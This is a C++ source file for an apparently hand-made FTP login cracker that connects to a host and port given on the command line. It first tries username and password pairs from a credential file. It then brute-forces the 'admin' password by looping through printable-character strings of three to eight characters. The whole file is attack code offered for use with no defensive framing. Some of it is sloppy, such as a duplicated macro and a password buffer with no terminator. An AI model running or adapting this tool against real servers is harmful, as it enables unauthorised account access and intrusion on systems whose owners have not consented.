#define F_CRY "FTP_CRY"

#include<iostream>
#include<iomanip>
#include<fstream>
#include<signal.h>
extern "C" {
#include <clog/clog.h>
}
#include <Node/Node.hpp>
#include "init.h"

using namespace std;

node::Node n;

inline void print(string str){
    cout << str << endl;
}

inline const char *scan(){
  return n.readln();
}

/*
char *scan(int servfd){
  char *buffer = (char *)malloc(256);
memset(buffer, 0, 256);
char *pBuf = buffer;
int bytesLeft = 256 - sizeof(char);

while(bytesLeft > 0)
{
    int n = read(servfd, pBuf, bytesLeft);
    if (n < 0)
    {
        cout << "ERROR reading from socket" << endl;
        break;
    }
    if(n == 0)
    {
        cout << "peer shutted down" << endl;
        break;
    }
    pBuf += n;
    bytesLeft -= n;
}
cout << buffer << endl;
return buffer;
}
*/

bool checkCode(const char *msg, const char *code){
    if(msg[0] == code[0] &&
       msg[1] == code[1] &&
       msg[2] == code[2])
        return true;
    return false;
}

int auth_cnt = 0;

/*
bool authenticate(int servfd, string user, string pass){
    auth_cnt++;
    if(pass == "guess"){
        cout << "\x1b[32mpassword found: " << pass << " | tries: "<< auth_cnt << "\x1b[0m" << endl;
        return true;
    }
    return false;
}
*/

bool authenticate(string user, string pass){
    auth_cnt++;
    log_inf(F_CRY, "submitting username");
    scan();
    n.writeln("user " + user);

    if(!checkCode(scan(), "331")){
        log_err(F_CRY, "protocol mismatch");
        return false;
    }
    log_inf(F_CRY, "submitting password");
    n.writeln("pass " + pass);

    if(!checkCode(scan(), "230")){
        log_err(F_CRY, "credentials failed");
        return false;
    }
    log_inf(F_CRY, "credentials accepted");
    return true;
}




int tryKnown(){
    ifstream in("login.txt");
    if(!in){
        print("file 'login.txt' not found");
        return -1;
    }
    string user;
    string pass;
    while (!in.eof()) {
        in >> user;
        in >> pass;
        if(authenticate(user, pass)){
            log_inf(F_CRY, "combination %s and %s worked", user.c_str(), pass.c_str());
            return 0;
        }
        log_err(F_CRY, "combination %s and %s failed", user.c_str(), pass.c_str());
    }
    return -1;
}

#define MIN_USER_CHARS 3
#define MAX_USER_CHARS 8

#define MIN_PASS_CHARS 3
#define MAX_USER_CHARS 8

char *pass;
int _initial = 0;
int _pas_r = 0;
pthread_t bruteThread;
int bruteText(int count){
    if(count == _initial){
        pass = (char *)malloc(count); //TODO
    }
    if(count == 0)return -1;
    for(int charset = 32; charset < 127; charset++){
        pass[_initial - count] = charset;
        bruteText(count - 1);
        if(authenticate("admin", pass)){
            exit(EXIT_SUCCESS);
        }
        cout << setw(_pas_r) << setfill('a') << pass << '\r';
    }
    return -1;
}

/* TODO implement thread semaphores for bufferd cacking
 */
int bruteforceLogin(int user_range[2], int pass_range[2]){
    //for(int usr_r = user_range[0]; usr_r < user_range[1]; usr_r++){
        for(_pas_r = pass_range[0]; _pas_r < pass_range[1]; _pas_r++){
            //authenticate***
            _initial = _pas_r;
            if(bruteText(_pas_r) == 0){
                cout << "Current set with range: " << _pas_r << " passed with pass " << pass << endl;
                return 0;
            }
            cout << "Current set with range: " << "\x1b[31m" << _pas_r << " failed\x1b[0m" << endl;
        }
    //}
    return -1;
}

int time_elapsed(){
  return 0;
}

int time_remaining(){
  return 0;
}

void exit_handler(int sig){
    cout << "tries: " << auth_cnt;
    cout << endl << "saving results for later use..." << endl;
    exit(sig);
}

void try_handler(int sig){
    cout << "tries: " << auth_cnt << " | time elapsed: " << time_elapsed() << " | time remaining: " << time_remaining() << endl;
}

int main(int argc, char *argv[]){
	int RPORT = 21;
	string RHOST = "localhost";
  //TODO add custom port switch -p and protocol switch -P
  if(argc != 3){
    cout << "Uage: infinity <host> <port>" << endl;
    return -1;
  }

  RHOST = argv[1];
  RPORT = atoi(argv[2]);

init();
    signal(SIGINT, exit_handler);
    signal(SIGQUIT, try_handler);

    if(n.connect(RHOST.c_str(), RPORT) < 0 ){
        print("Cannot connect to the server");
        return -1;
    }
    cout << "Connected to the server: " << RHOST << endl;

    print("guessing logins");
    if(tryKnown() == 0){
        print("guessed login correctly");
        return 0;
    }
    print("cannot guess login");

    int user_range[] = {MIN_USER_CHARS, MAX_USER_CHARS};
    int pass_range[] = {MIN_PASS_CHARS, MAX_USER_CHARS};
    print("Bruteforcing login with default settings...this may take some time [~days]");
    if(bruteforceLogin(user_range, pass_range) < 0){
        print("cannot bruteforce login");
    }
	return 0;
}
